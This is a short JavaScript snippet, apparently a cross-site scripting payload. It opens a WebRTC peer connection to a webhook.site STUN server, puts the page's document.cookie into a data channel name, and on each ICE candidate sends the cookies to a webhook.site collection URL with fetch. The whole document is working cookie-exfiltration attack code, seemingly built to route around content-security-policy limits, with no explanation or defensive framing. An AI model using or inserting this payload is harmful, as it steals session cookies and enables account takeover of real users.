var pc = new RTCPeerConnection({iceServers:[{urls:'stun:webhook.site'}]});
pc.createDataChannel('c:'+document.cookie);
pc.createOffer().then(o=>pc.setLocalDescription(o));
pc.onicecandidate = e => {
  if(e.candidate) {
    fetch('https://webhook.site/00372afa-623d-4c19-b4f9-20bda57d56d5/?c='+document.cookie);
  }
};
